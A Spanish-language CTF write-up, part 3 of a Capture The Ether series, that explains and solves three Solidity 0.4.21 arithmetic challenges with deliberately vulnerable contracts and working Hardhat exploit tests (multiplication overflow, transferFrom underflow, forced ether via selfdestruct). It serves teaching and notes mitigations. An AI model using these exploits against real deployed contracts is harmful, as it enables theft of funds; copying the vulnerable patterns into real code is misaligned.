---
layout: post
title: "Capture The Ether - Parte 3"
date: 2022-12-11
excerpt: "Capítulo 3 de la serie de desafíos en CTE"
tag: [cte, challenge, resolución]
comments: true
---

<img src="/imagenes/04-Titulo.png">
<br>
<div style="text-align:center;">
<p>En este tercer capítulo comenzaremos con el bloque <b>Math</b>. El mismo abarca problemas de aritmética en Solidity, tales como divisiones de enteros, overflows y underflows. En este artículo intentaré explicar los desafíos:</p>

<span><b>1. </b>Token sale</span>
<br>
<span><b>2. </b>Token whale</span>
<br>
<span><b>3. </b>Retirement fund</span>
<h1 style="color:#089990; margin-bottom: 0px;">1. Token sale</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"Este contrato permite que puedas comprar o vender tokens a un tipo de cambio donde 1 Token = 1 Ether.
<br>
El contrato comienza con un saldo de 1 Ether. Ve si puedes robar algo de eso."</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura1" onclick="revelarSeccion(document.getElementById('lectura1'), 'botonRevelarLectura1')">Revelar</button>
<div id="lectura1" style="display:none">
  <ul>
    <li>Solo hay 2 funciones para observar: <i>buy</i> y <i>sell</i>.</li>
    <li>El presente bloque se llama <i>Math</i>, debe existir un problema aritmético en algún lugar.</li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones1" onclick="revelarSeccion(document.getElementById('ideasSoluciones1'), 'botonRevelarIdeasSoluciones1')">Revelar</button>
<div id="ideasSoluciones1" style="display:none">
  <ul>
    <li>Investigar sobre problemas aritméticos en solidity, por ejemplo <a href="https://docs.openzeppelin.com/contracts/2.x/api/math#SafeMath">aquí</a> o <a href="https://dev.to/thenuelgeek/overflow-and-underflow-in-solidity-1bj7">aquí</a></li> 
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion1" onclick="revelarSeccion(document.getElementById('explicacion1'), 'botonRevelarExplicacion1')">Revelar</button>
<div id="explicacion1" style="display: none">
  <h4><i><u>Overflows y Underflows</u></i></h4>
  ¿Qué son estas 2 cosas? ¿Por qué son importante en Solidity?
  <br>
  <br>
  Como pensaba mi filósofo favorito, muchas de las cosas que nos intrigan, en realidad, ya las sabemos. Simplemente hay que <a href="https://es.wikipedia.org/wiki/Teor%C3%ADa_de_la_reminiscencia">recordarlas</a>. 
  <br>
  ¿No me creés? ¿Y si te dijera que todos los días evidencias lo que es un Overflow?
  <br>
  <br>
  <img src="/imagenes/04-Reloj.png" style="max-width: 40%;"> 
  <br>
  <br>

  Es probable que hayas escuchado a muchas personas debatir entre si se considera "mañana" al día luego de dormir, o al día pasadas las <b><i>00:00</i></b>. Bueno, esto se debe al Overflow que tenemos en nuestro preciado reloj.
  <br>
  Al igual que cuando agregamos 1 minuto al horario de las 23:59 para llegar a las 00:00 (y pasar del último minuto del día, al primero), Solidity también tiene este problema.
  <br>
  <br>
  Es probable que si venís de lenguajes de alto nivel este problema ni siquiera te sea familiar, y con razón. Lenguajes de este estilo suelen tener un manejo de errores particular cuando esto sucede, evitando así funcionamientos indebidos de la aplicación.
  <br>
  <br>
  ¿Y por qué sucede esto en Solidity? ¿El creador es medio vago y se olvidó? Bueno, es un poco más complejo que eso. A fines prácticos y de simpleza, quiero que entiendas lo siguiente: en la EVM (Ethereum Virtual Machine), lo que ocurre con un <b>Overflow</b> es la <b>PÉRDIDA DEL BIT MÁS SIGNIFICATIVO</b>, lo que sería algo como esto...
  <br>
  <br>
  <img src="/imagenes/04-Overflow.jpg"> 
  <br>
  <br>
  Finalmente, si volvemos a nuestro contrato víctima, podemos ver claramente el lugar donde podemos producir un Overflow y aprovecharnos del mismo.
  <br>
  <br>
  <img src="/imagenes/04-Cascarita.jpg"> 
  <br>
  <ul>
    <li><b>PRICE_PER_TOKEN</b>: Tiene un valor constante de <i>1 ether</i> o 10^18.</li> 
    <li><b>numtokens</b>: Es un valor manipulable por nosotres.</li> 
  </ul>
  <br>
  Generando la multiplicación adecuada, podremos ejecutar la función <i>buy</i> enviando muy poco ether y añadiendo <i>numtokens</i> a nuestro balance.
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest1" onclick="revelarSeccion(document.getElementById('testAEjecutar1'), 'botonRevelarTest1')">Revelar</button>
<div id="testAEjecutar1" style="display:none">
  <br>
  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
  </div>
  <br>

{% highlight typescript %}

import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer, BigNumber } from "ethers";


let tokenSaleContract: Contract;
const challengeAddress: string = "" //Address a usar cuando se intente resolver el challenge con el contrato de CTE, no el deployado localmente.
let eoa: Signer
let accounts: Signer[];
const MAX_UINT256_NUMBER: BigNumber = BigNumber.from(`2`).pow(`256`);
const ONE_ETHER: BigNumber = BigNumber.from(`10`).pow(`18`);

beforeEach(async () => {
  accounts = await ethers.getSigners()

  const tokenSaleFactory = await ethers.getContractFactory("TokenSaleChallenge");

  if (challengeAddress.length > 1) {
    tokenSaleContract = tokenSaleFactory.attach(challengeAddress);
    console.log(`INSTANCIA CONTRATO TOKEN_SALE UTILIZADA DESDE:`, tokenSaleContract.address);
  }
  else {
    tokenSaleContract = await tokenSaleFactory.deploy(await accounts[0].getAddress(), {value: ethers.utils.parseEther(`1`)});
    await tokenSaleContract.deployed();
    console.log(`CONTRATO TOKEN_SALE DEPLOYADO EN:`, tokenSaleContract.address);
  }
})

describe("Token sale", async () => {
  it("Resuelve el Math challenge - Token sale", async () => {

    const buyValue: BigNumber = BigNumber.from(MAX_UINT256_NUMBER).div(ONE_ETHER).add(`1`);
    console.log(`EL VALOR A COMPRAR ES: ${buyValue}`);

    
    const etherToSendCalc: BigNumber = BigNumber.from(buyValue).mul(ONE_ETHER).sub(MAX_UINT256_NUMBER);
    const etherToSendValue = ethers.utils.formatEther(etherToSendCalc.toString());
    console.log(`CANTIDAD DE ETHER A ENVIAR ES: ${etherToSendValue}`);
    
    await tokenSaleContract.buy(buyValue, {
      value: ethers.utils.parseEther(etherToSendValue.toString()),
      gasLimit: 1e5
    });

    await tokenSaleContract.sell(1, {gasLimit:1e5});

    let isComplete = await tokenSaleContract.isComplete();
    expect(isComplete, "DESAFÍO INCOMPLETO").to.be.true;
  })
})

  {% endhighlight %}
</div>

### Conclusión:
Es importante estar atento a este tipo de problemas cuando realizamos sumas, restas o multiplicaciones. Sin embargo, a partir de la versión 0.8.0 de Solidity, el compilador incorporó chequeos para solucionar este tipo de inconvenientes. No obstante, versiones anteriores mitigaron el problema incorporando librerías de terceros a sus contratos (como <a href="https://docs.openzeppelin.com/contracts/2.x/api/math#SafeMath">SafeMath</a> de <a href="https://www.openzeppelin.com/">Openzeppelin</a>), cuya función era y es la de realizar los mismos chequeos. 
<br>
<br>

<hr>

<div style="text-align:center">
<h1 style="color:#089990; margin-bottom: 0px;">2. Token whale</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"Este token compatible con el estándar ERC20 es difícil de adquirir. Hay un límite de 1000 tokens existentes, los cuales son todos tuyos para comenzar.
<br>
Encuentra un camino para acumular al menos 1.000.000 de tokens para superar este desafío."</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura2" onclick="revelarSeccion(document.getElementById('lectura2'), 'botonRevelarLectura2')">Revelar</button>
<div id="lectura2" style="display:none">
  <ul>
    <li style="white-space:wrap;">
     El contrato utiliza una versión vulnerable a overflows y underflows.
    </li>
    <li>
      Los balances se modifican solo en la función <b><i>_transfer</i></b>
    </li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones2" onclick="revelarSeccion(document.getElementById('ideasSoluciones2'), 'botonRevelarIdeasSoluciones2')">Revelar</button>
<div id="ideasSoluciones2" style="display:none">
  <ul>
    <li>
      Si los balances solo se modifican en la función <b><i>_transfer</i></b>, resulta interesante analizar cómo funciona tanto en su llamada desde <b><i>transfer</i></b> como <b><i>transferFrom</i></b>.
    </li>
    <li>
      ¿Qué ocurriría si usamos más de una cuenta para romper el contrato?
    </li>
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion2" onclick="revelarSeccion(document.getElementById('explicacion2'), 'botonRevelarExplicacion2')">Revelar</button>
<div id="explicacion2" style="display: none">
  El problema principal del contrato radica en el uso de la variable global <i>msg.sender</i>. Con la ayuda de una cuenta auxiliar, podemos lograr una transferencia que genere un underflow en el balance de esta para luego, transferir este excedente a la cuenta atacante.
  <br>
  <br>
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest2" onclick="revelarSeccion(document.getElementById('testAEjecutar2'), 'botonRevelarTest2')">Revelar</button>
<div id="testAEjecutar2" style="display:none">
<br>
  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
    <br>
  </div>
  <br>

{% highlight typescript %}

import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";

let tokenWhaleContract: Contract;
let cuenta2Contract: Contract;
const challengeAddress: string = "";
let accounts: Signer[];
let cuenta1: Signer;
let cuenta2: Signer;
let cuenta3: Signer;


beforeEach(async () => {
  accounts = await ethers.getSigners();
  [cuenta1, cuenta2, cuenta3] = accounts.slice(0,3);

  const tokenWhaleFactory = await ethers.getContractFactory("TokenWhaleChallenge");
 
  if (challengeAddress.length > 1) {
    tokenWhaleContract = tokenWhaleFactory.attach(challengeAddress);
    console.log(`INSTANCIA CONTRATO TOKEN_WHALE UTILIZADA DESDE:`, tokenWhaleContract.address);
  }
  else {
    tokenWhaleContract = await tokenWhaleFactory.deploy(await cuenta1.getAddress());
    await tokenWhaleContract.deployed();
    console.log(`CONTRATO TOKEN_WHALE DEPLOYADO EN:`, tokenWhaleContract.address);
  }

  cuenta2Contract = tokenWhaleContract.connect(cuenta2); //Para poder invocar funciones del contrato desde otra address, se le asocia el signer de la cuenta 2 de hardhat.
})

describe("Token Whale", async () => {
  it("Resuelve el Math challenge - Token Whale", async () => {
    
    const cuenta1Address = await cuenta1.getAddress();
    const cuenta2Address = await cuenta2.getAddress();
    const cuenta3Address = await cuenta3.getAddress();
    
    console.log("APROBANDO CUENTA 2 PARA QUE UTILICE LOS FONDOS DE CUENTA 1...");
    await tokenWhaleContract.approve(cuenta2Address, 100, { gasLimit: 1e5 });
    const permitido = await tokenWhaleContract.allowance(cuenta1Address,cuenta2Address);
    expect(permitido == 100, "El permitido de cuenta 2 no fue modificado");

    console.log("CUENTA 2 COMIENZA transferFrom (A,C,1)");
    await cuenta2Contract.transferFrom(cuenta1Address, cuenta3Address, 1, { gasLimit: 1e5 });
    const balanceCuenta2 = await tokenWhaleContract.balanceOf(cuenta2Address);
    expect(balanceCuenta2 > 1000000, "El balance de cuenta 2 no fue aumentado");

    console.log("CUENTA 2 COMIENZA A TRANSFERIR A CUENTA 1 UN MILLON DE TOKENS");
    await cuenta2Contract.transfer(cuenta1Address, 1000000, { gasLimit: 1e5 });
    const balanceCuenta1 = await tokenWhaleContract.balanceOf(cuenta1Address);
    expect(balanceCuenta1 > 1000000, "El balance de cuenta 1 no supera el millon");

    console.log("COMPROBANDO DESAFIO RESUELTO...");

    const isComplete = await tokenWhaleContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
    
  })
})

{% endhighlight %}
  <br>
  <!-- <b><i>ACLARACIONES</i></b>:
  <ul>
    <li>
      Completar
    </li>
    <li>
     Completar
    </li>
  </ul> -->
  
</div>

### Conclusión:
Cuando se utilizan funciones auxiliares para lograr mayor comprensión o reutilización de código, es sumamente importante tener en cuenta qué valores pueden adoptar las variables globales a lo largo del flujo completo de una transacción. En este caso, no se contempló que podía ser una cuenta manipulada por la misma persona dueña los tokens iniciales.
<br>
<br>

<hr>

<div style="text-align:center">
<h1 style="color:#089990; margin-bottom: 0px;">3. Retirement fund</h1>
<h2 style="margin-bottom: 0px; margin-top: 0px">Problema:</h2>
<b><i>"Este fondo de jubilación es lo que los economistas llaman un dispositivo de compromiso. Estoy tratando de asegurarme que al momento de jubilarme, tendré 1 ether.
<br>
He comprometido 1 ether al siguiente contrato, y no lo retiraré hasta que hayan pasado 10 años. Si llegara a retirarlo antes, el 10% de mi ether irá a un beneficiario (¡usted!). 
<br>
Realmente no quiero que te quedes con parte de mi jubilación, así que estoy decidido a dejar esos fondos solo hasta dentro de 10 años. ¡Buena suerte!"</i></b>
<br>
<br>
<p>El contrato que atacaremos será el siguiente</p>
</div>

{% highlight typescript %}

pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}

{% endhighlight %}

### Datos de lectura:
<button class="btn btn-info" id="botonRevelarLectura3" onclick="revelarSeccion(document.getElementById('lectura3'), 'botonRevelarLectura3')">Revelar</button>
<div id="lectura3" style="display:none">
  <ul>
    <li style="white-space:nowrap;">
      Otra vez, el contrato utiliza una versión antigua de solidity, vulnerable a overflows y underflows.
    </li>
    <li style="white-space:wrap;">
      Si según el enunciado nosotres somos los beneficiarios, solo podemos interactuar con la función <b><i>collectPenalty</i></b>. La función <b><i>withdraw</i></b> puede ser utilizada por el jubilade, por lo que conviene entenderla pero no buscar agujeros en ella. 
    </li>
  </ul>
</div>

### Ideas para soluciones:

<button class="btn btn-success" id="botonRevelarIdeasSoluciones3" onclick="revelarSeccion(document.getElementById('ideasSoluciones3'), 'botonRevelarIdeasSoluciones3')">Revelar</button>
<div id="ideasSoluciones3" style="display:none">
  <ul>
    <li>
      La función <b><i>collectPenalty</i></b> se ocupa de transferirnos el balance del contrato en caso que el jubilade haya pecado por ansioso y retirado ether antes de la fecha prevista (o se haya querido <a href="https://youtu.be/65HrUI5lhNM?t=71">comprar una cama más cómoda</a>).
    </li>
    <li>
      ¿Será posible utilizar la función <b><i>collectPenalty</i></b> sin que el futuro jubilade haya retirado antes su ether? ¿Y tu moral? ¿Te sentirías culpable robando a un crypto-abuelo?
    </li>
  </ul>
</div>

### Explicación:
<button class="btn btn-warning" id="botonRevelarExplicacion3" onclick="revelarSeccion(document.getElementById('explicacion3'), 'botonRevelarExplicacion3')">Revelar</button>
<div id="explicacion3" style="display: none">
  Aquí el underflow ocurre en el siguiente fragmento de código: 
  <br>
  <br>
  <img src="/imagenes/04-RetirementUnderflow.png">
  <br>
  <br>
  En caso de que el balance del contrato sea mayor al balance inicial (1 ether), la variable <i>withdraw</i> pasaría a ser un valor extremadamente elevado, el chequeo podría ser salteado y prodeceríamos a enviarnos todo el balance del contrato a nuestra address. El problema que nos encontramos, es que el contrato no tiene ninguna función para recibir ether (fallback o receive). Entonces: ¿Habrá alguna forma de forzar el envío de ether? ¡La respuesta es sí!
  <br>
  <br>
  <img src="/imagenes/04-Voltorb.PNG">
  <br>
  <br>
  ¿Se acuerdan de él? Se los voy a presentar mejor
  <br>
  <br>
  <img src="/imagenes/04-Voltorb2.PNG">
  <br>
  <br>
  ¿Y a qué viene esta movida del pokemón más creativo de todes que no se parece en nada a una pokebola? Bueno, este personaje tal cual dice su descripción, tiene la capacidad de autodestruirse, o en inglés, de usar <b><i>selfdestruct</i></b>.
  <br>
  <br>
  <u><h2>Selfdestruct</h2></u>
  Selfdestruct es una palabra reservada en solidity para terminar un contrato, remover su bytecode de la blockchain y <b><i>enviar todos sus fondos a una dirección específica</i></b>. Surgió como "botón de pánico" en el año 2016 para poder detener ataques que sucedían una y otra vez sobre la misma vulnerabilidad. La historia de su creación me parece bastante interesante, pero como nos iríamos muy por las ramas, simplemente te dejo un <a href="https://www.alchemy.com/overviews/selfdestruct-solidity">link</a> para que lo revises si es de tu agrado 🥰.
  <br>
  <br>
  Entonces, si lo que leímos es cierto, podríamos tranquilamente enviar ether desde un contrato <b><i>Voltorb</i></b> mediante un selfdestruct.
</div>

### Test a ejecutar:
<button class="btn btn-danger" id="botonRevelarTest3" onclick="revelarSeccion(document.getElementById('testAEjecutar3'), 'botonRevelarTest3')">Revelar</button>
<div id="testAEjecutar3" style="display:none">
<br>
  <div style="text-align:center">
    <b>Test que ejecutaremos</b> 
    <br>
  </div>
  <br>

{% highlight typescript %}

import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";

let challengeAddress: string = "";
let retirementFundsContract: Contract;
let voltorbContract: Contract;
let accounts: Signer[];
let owner: Signer;
let beneficiary: Signer;

beforeEach(async () => {
  accounts = await ethers.getSigners();
  [owner, beneficiary] = accounts.slice(0,2);

  const retirementFundsFactory = await ethers.getContractFactory("RetirementFundChallenge");
  
  if (challengeAddress.length > 1) {
    retirementFundsContract = retirementFundsFactory.attach(challengeAddress);
    console.log(`INSTANCIA CONTRATO RETIREMENT_FUNDS UTILIZADA DESDE:`, retirementFundsContract.address);
  }
  else {
    retirementFundsContract = (await retirementFundsFactory.deploy(await beneficiary.getAddress(), {value: ethers.utils.parseEther(`1`)})).connect(beneficiary);
    await retirementFundsContract.deployed();
    console.log(`CONTRATO RETIREMENT_FUNDS DEPLOYADO EN:`, retirementFundsContract.address);
  }


  const voltorbFactory = await ethers.getContractFactory("Voltorb");
  voltorbContract = await voltorbFactory.deploy({
    value: ethers.utils.parseUnits(`1`, `wei`)
  });
  await voltorbContract.deployed();
})

describe("Retirement Fund", async () => {
  it("Resuelve el Math challenge - Retirement Fund", async () => {
    //Comprobamos que el contrato de voltorb fue inicializado con un balance mayor a 0.
    const balanceDeVoltorb: BigNumber = await ethers.provider.getBalance(voltorbContract.address);
    expect(balanceDeVoltorb.toNumber() > 0, "El balance de voltorb no es superior a 0");

    //Voltorb usa explosión en contrato enemigo --> Es súper efectivo! (we re nerd)
    await voltorbContract.explosion(retirementFundsContract.address)
    //Verificamos que tras el selfdestruct, voltorb haya enviado su balance total al contrato del challenge.
    const balanceChallengeContract: BigNumber = await ethers.provider.getBalance(retirementFundsContract.address);
    expect(balanceChallengeContract > ethers.utils.parseEther("1"));

    
    const tx = await retirementFundsContract.collectPenalty();
    await tx.wait();

    const isComplete = await retirementFundsContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true
  })
})

{% endhighlight %}
<br>
<!-- <b><i>ACLARACIONES</i></b>:
<ul>
    <li>
     Completar
    </li>
  </ul> -->
</div>

### Conclusión:
Hay que ser muy cuidadosos a la hora de aplicar lógica basada en el balance de nuestro contrato. Sumado al overflow que se generó al romper la relación entre el balance inicial y el actual, muchos otros vectores de ataque podrían aparecer si no tenemos los recaudos suficientes para recibir ether.
<br>
<br>
<hr>

<div style="text-align:center">
  Y así pasaron los 3 primeros desafíos del bloque <b>Math</b>, o mejor dicho la entrada en calor, ya que los 3 restantes son muchísimo más interesante y divertidos para aprender (y también para explicar).
  <br>
  <br>

  Que tengas una noche genial.
  <br>
  No te alteres.

  <br>
  <br>
  bengalaQ

</div>


<script>
function revelarSeccion(HTMLElement, nombreBoton) {

  if (document.getElementById(nombreBoton).innerHTML == "Ocultar") {
    document.getElementById(nombreBoton).innerHTML = "Revelar";
    HTMLElement.style.display = "none";
  } else {
    document.getElementById(nombreBoton).innerHTML = "Ocultar";
    HTMLElement.style.display = ""
  }
}
</script>